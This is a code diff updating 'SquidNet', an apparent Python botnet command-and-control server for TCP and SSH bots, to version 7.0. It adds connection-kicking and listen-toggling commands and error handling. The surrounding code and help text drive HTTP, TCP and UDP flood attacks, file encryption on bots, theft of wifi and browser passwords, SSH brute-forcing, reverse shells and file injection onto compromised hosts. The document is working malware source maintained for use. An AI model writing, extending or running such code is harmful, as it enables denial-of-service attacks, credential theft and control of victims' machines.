@@ -115,7 +115,10 @@ tar -xf {os.getcwd()}/ngrok.zip
         else:
             adminpass = arg.adminpass
         if arg.key is None:
-            key = b'QAYEFKLQT469LdHWIs4ZG7xKrDr8JRzMTwNFvoQFILg='
+            try:
+                key = Fernet.generate_key()
+            except:
+                key = b'QAYEFKLQT469LdHWIs4ZG7xKrDr8JRzMTwNFvoQFILg='
         else:
             key = str(arg.key).encode()
         if arg.passfile is None:
@@ -172,7 +175,8 @@ class Botnet:
                 self.log(
                     "\n[(ERROR)]: Error starting up server - Brute-forcing file is not in directory!\n[(CLOSE)]: Server is closing.....")
             sys.exit()
-        self.version = "6.942.0"
+        self.version = "7.0"
+        self.connportlist = []
         self.conn_list = []
         self.admin_conn = []
         self.ips = []
@@ -191,9 +195,16 @@ class Botnet:
         except:
             self.ngroklink = self.ip
             self.ngrokport = self.port
+        self.listenforconn = True
         self.botscript = self.bot_script()
         self.serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.serv.bind((ip, port))
+        try:
+            self.serv.bind((ip, port))
+        except Exception as e:
+            self.logo()
+            print("[+] The Server cannot be started! Check the logs for more info.")
+            self.log(f"[(ERROR)]: Unable to bind IP and Port due to: {e}")
+            sys.exit()
         self.adminconfig = threading.Thread(target=self.configure_adminfile)
         self.adminconfig.start()
         self.cwd = os.getcwd()
@@ -265,14 +276,14 @@ class Botnet:
     def log_logo(self):
         """Logo of this script."""
         logo = """
-  _____             _     _ _   _      _             __  ___  _  _ ___    ___  
- / ____|           (_)   | | \ | |    | |           / / / _ \| || |__ \  / _ \ 
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __/ /_| (_) | || |_ ) || | | |
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / / '_ \ __, |__   _/ / | | | |
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V /| (_) | / /   | |/ /_ | |_| |
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/  \___(_)_/    |_|____(_)___/ 
-           | |                                                                 
-           |_|                                                                                                                                                               
+  _____             _     _ _   _      _         ______ ___  
+ / ____|           (_)   | | \ | |    | |       |____  / _ \ 
+| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __ / / | | |
+ \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / // /| | | |
+ ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V // / | |_| |
+|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_//_(_) \___/ 
+           | |                                               
+           |_|                                                                                                                                                                          
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         return logo
     def logo(self):
@@ -284,7 +295,11 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         print("[+] !help                                - Displays all of the commands.")
         print("[+] !whatsnew                            - Displays all new features.")
         print("[+] !getconninfo                         - Displays info about all of the connections.")
+        print("[+] !genadminscript                      - Generates the admin script for remote connections to this server.")
+        print("[+] !genscript                           - Generates the bot python script needed to connect to this server.")
         print("[+] !clear                               - Clears the output.")
+        print("[+] !togglelisten                        - Toggles whether to stop accepting connections or start accepting them.")
+        print("[+] !kick [hostname] [srcport]           - Kicks a client off of the Botnet.")
         print("\n[+] Commands for TCP Botnet:\n")
         print("[+] !httpflood [website] [delay]         - Denial Of Services the website provided.")
         print("[+] !tcpflood [ip] [port] [delay] [size] - Floods the target with TCP Packets.")
@@ -305,7 +320,6 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         print("[+] !encdir                              - Encrypts all files in the bot working directory")
         print("[+] !decdir                              - Decrypts all files in the bot working directory")
         print("[+] !botcount                            - Gets the amount of connected bots.")
-        print("[+] !genscript                           - Generates the bot python script needed to connect to this server.")
         print("[+] !stopatk                             - Stops any ongoing DDoS Attacks in the Botnet.")
         print("[+] !changedirdesktop                    - Sets the bot working directory to their Desktop.")
         print("[+] !listdir                             - Lists some of the files in the bot working directories(recommended for small botnets)")
@@ -314,7 +328,6 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         print("[+] !getip                               - Gets the IP of the bots")
         print("[+] !getwifi                             - Obtains the wifi names and passwords of the bots(windows only)")
         print("[+] !savefile                            - Obtains a file from the bots directory.")
-        print("[+] !genadminscript                      - Generates the admin script for remote connections to this server.")
         print("[+] !getcwd                              - Gets the bots working directory.")
         print("[+] !getos                               - Gets the OS Of the bots.")
         print("[+] !getpasswords                        - Gets the stored browser passwords of the bots.")
@@ -352,53 +365,61 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                 tokenfile.close()
         except:
             with open('token.txt', 'w') as tokenfile:
-                key = b'QAYEFKLQT469LdHWIs4ZG7xKrDr8JRzMTwNFvoQFILg='
+                key = self.key
                 tokenfile.write(str(key))
                 tokenfile.close()
     def listen(self):
         """This function listens for connections from admins and bots alike.
         The first message recieved will be interpreted as the name of the device
         and it will displayed for the Admins to see. A thread is created for the
-        handling of the connection."""
+        handling of the connection. If variable 'self.listenforconn' is False, then
+        the server will not listen for connections."""
         while True:
             try:
-                flag = 0
-                self.serv.listen(1)
-                c, ip = self.serv.accept()
-                msg = c.recv(1024).decode().strip()
-                self.bot_count += 1
-                split_msg = msg.split()
-                hostname = split_msg[0]
-                try:
-                    ipaddr = str(split_msg[1])
-                except:
-                    ipaddr = "Unknown"
-                try:
-                    user = str(split_msg[2])
-                except:
-                    user = "Unknown"
-                try:
-                    connection = str(ip[1])
-                except:
-                    connection = "Unknown"
-                try:
-                    opsys = split_msg[3]
-                except:
-                    opsys = "Unknown"
-                self.log(f"""
+                if self.listenforconn:
+                    flag = 0
+                    self.serv.listen(1)
+                    c, ip = self.serv.accept()
+                    if not self.listenforconn:
+                        c.close()
+                    else:
+                        msg = c.recv(1024).decode().strip()
+                        self.bot_count += 1
+                        split_msg = msg.split()
+                        hostname = split_msg[0]
+                        try:
+                            ipaddr = str(split_msg[1])
+                        except:
+                            ipaddr = "Unknown"
+                        try:
+                            user = str(split_msg[2])
+                        except:
+                            user = "Unknown"
+                        try:
+                            connection = str(ip[1])
+                        except:
+                            connection = "Unknown"
+                        try:
+                            opsys = split_msg[3]
+                        except:
+                            opsys = "Unknown"
+                        self.connportlist.append(hostname + " " + str(ip[1]) + " " + str(c))
+                        self.log(f"""
 [({hostname})---->(SERVER)]:
 [+] HOSTNAME: {hostname}
 [+] IPADDR  : {ipaddr}
 [+] USERNAME: {user}
-[+] CONNN   : {connection}
+[+] CONN    : {connection}
 [+] OS      : {opsys}
-                """)
-                info = str(hostname+" "+ipaddr+" "+user+" "+connection+" "+opsys)
-                self.info.append(info)
-                print(f"\n[!] {hostname} has connected to the botnet.")
-                self.log(f"\n[(CONNECTION)]: {hostname} has connected to the botnet.")
-                handle = threading.Thread(target=self.handler, args=(c, hostname, self.bot_count, info))
-                handle.start()
+                                                            """)
+                        info = str(hostname + " " + ipaddr + " " + user + " " + connection + " " + opsys)
+                        self.info.append(info)
+                        print(f"\n[!] {hostname} has connected to the botnet.")
+                        self.log(f"\n[(CONNECTION)]: {hostname} has connected to the botnet.")
+                        handle = threading.Thread(target=self.handler, args=(c, hostname, self.bot_count, info))
+                        handle.start()
+                else:
+                    pass
             except Exception as e:
                 self.log(f"\n[(ERROR)]: {str(e)}")
     def log(self, msg):
@@ -541,7 +562,7 @@ ________________________________________________________
                             try:
                                 targ_website = msgtobot[1]
                                 atk_delay = msgtobot[2]
-                                servmsg = f"[({hostname})] Beginning HTTP Flood Attack on {targ_website} with delay of {atk_delay}.\n"
+                                servmsg = f"[({hostname})]: Beginning HTTP Flood Attack on {targ_website} with delay of {atk_delay}.\n"
                                 self.log("\n" + servmsg)
                                 print(servmsg)
                                 c.send(
@@ -557,7 +578,7 @@ ________________________________________________________
                             msgtobot = msg.split()
                             try:
                                 target = msgtobot[1]
-                                servmsg = f"[({hostname})] Beginning TCP Flood Attack on {target}.\n"
+                                servmsg = f"[({hostname})]: Beginning TCP Flood Attack on {target}.\n"
                                 self.log("\n" + servmsg)
                                 print(servmsg)
                                 c.send(
@@ -573,7 +594,7 @@ ________________________________________________________
                             msgtobot = msg.split()
                             try:
                                 target = msgtobot[1]
-                                servmsg = f"[({hostname})] Beginning UDP Flood Attack on {target}.\n"
+                                servmsg = f"[({hostname})]: Beginning UDP Flood Attack on {target}.\n"
                                 self.log("\n" + servmsg)
                                 print(servmsg)
                                 c.send(
@@ -663,9 +684,12 @@ ________________________________________________________
                             self.log(filemsg)
                             file_created = False
                     elif not self.savefile:
-                        msgtoadmin = f"\n[({hostname})]: {msg}"
-                        self.log(msgtoadmin)
-                        print(msgtoadmin)
+                        try:
+                            msgtoadmin = f"[({hostname})]: {msg.strip()}"
+                            self.log("\n" + msgtoadmin)
+                            print("\n" + msgtoadmin)
+                        except Exception as e:
+                            self.log(f"\n[(ERROR)]: {e}")
                         for adminconn in self.admin_conn:
                             try:
                                 if c == adminconn:
@@ -675,10 +699,13 @@ ________________________________________________________
                             except Exception as e:
                                 self.log(f"\n[(ERROR)]: Unable to send msg to: {adminconn}.")
             except Exception as e:
-                self.log(f"\n[(ERROR)]: {hostname} seems defective(Error: {e}).\n[(CLOSECONN)]: Closing connection....")
-                print(f"\n[+] {hostname} seems defective.\n[+] Closing connection....\n")
-                c.close()
-                break
+                if "a bytes-like object is required, not 'str'" in str(e) or "An operation was attempted on something that is not a socket" in str(e):
+                    self.log(f"\n[(ERROR)]: Ignoring Error {e} in {hostname}")
+                else:
+                    self.log(f"\n[(ERROR)]: {hostname} seems defective(Error: {e}).\n[(CLOSECONN)]: Closing connection....")
+                    print(f"\n[+] {hostname} seems defective.\n[+] Closing connection....\n")
+                    c.close()
+                    break
     def ssh_login(self, ip, username, password):
         """Does regular logging in with SSH into the provided ip and username. There is no
         brute-forcing since a password arguement has be passed, and that the brute-force text
@@ -792,8 +819,8 @@ ________________________________________________________
         except:
             pass
     def ssh_inject(self, client, file):
-        """This function Opens up SFTP(Secure File Transfer Protocol) and sends a file
-        to the SSH-Bots, where they can be opened up on command."""
+        """This function Opens up SFTP(Secure File Transfer Protocol) and
+        sends a file to the SSH-Bots, where they can be opened up on command."""
         try:
             if "/" in file or "\\" in file:
                 result = ""
@@ -932,6 +959,34 @@ ________________________________________________________
                     filename = msg_split[1]
                     print(f"[+] Attempting to open file editor for file {filename} on the bots.")
                     self.log(f"\n[(SERVER)]: Attempting to open file editor for file {filename} on the bots.")
+                elif self.instruction.startswith("!togglelisten"):
+                    if self.listenforconn == True:
+                        print("[+] Stopped listening for connections.\n")
+                        self.log("\n[(SERVER)]: Stopped listening for connections.")
+                        self.listenforconn = False
+                    else:
+                        print("[+] Restarted listening for connections.\n")
+                        self.log("\n[(SERVER)]: Started to listen for connections.")
+                        self.listenforconn = True
+                elif self.instruction.startswith("!kick"):
+                    msg_split = self.instruction.split()
+                    host = msg_split[1]
+                    port = msg_split[2]
+                    conntokick = ""
+                    for i in self.connportlist:
+                        if host+"" in i and port+" " in i:
+                            conntokick = i
+                            break
+                    if conntokick == "":
+                        print("\n[+] Hostname or port is not registered in the botnet.")
+                        self.log(f"\n[(SERVER)]: Attempted to kick {host} from source port {port} but it did not exist.")
+                    else:
+                        for conn in self.conn_list:
+                            if str(conn) in conntokick:
+                                print(f"\n[+] Successfully kicked {host}.")
+                                self.log(f"\n[(SERVER)]: Kicked {host} at source port: {port}")
+                                conn.close()
+                                break
                 elif self.instruction.startswith("!whatsnew"):
                     print("""
 [+] New Features In the SquidNet:
@@ -945,11 +1000,15 @@ ________________________________________________________
 [+] - Fixed Error in Stopping DDoS Attacks(tried to call a bool object and not function).
 [+] - Made password list optional(however brute forcing cannot happen).
 [+] - Added '!cloneself' Command.
+[+] - Fixed more errors on the admins being kicked without reason.
 [+] - Upgraded reverse shell messages.
 [+] - Added '!getconninfo' Command.
 [+] - Made it so that '!clear', '!genscript' and '!genadminscript' are not sent to the clients.
+[+] - Fixed typos.
+[+] - Added '!kick' and '!togglelisten'
+[+] - Added display message when there is an error with binding the server.
                     """)
-                if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip() or "!whatsnew" in self.instruction.strip() or "!getconninfo" in self.instruction.strip() or "listsshbots" in self.instruction.strip():
+                if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip() or "!whatsnew" in self.instruction.strip() or "!getconninfo" in self.instruction.strip() or "listsshbots" in self.instruction.strip() or "!togglelisten" in self.instruction.strip():
                     pass
                 else:
                     if len(self.ssh_bots) != 0:
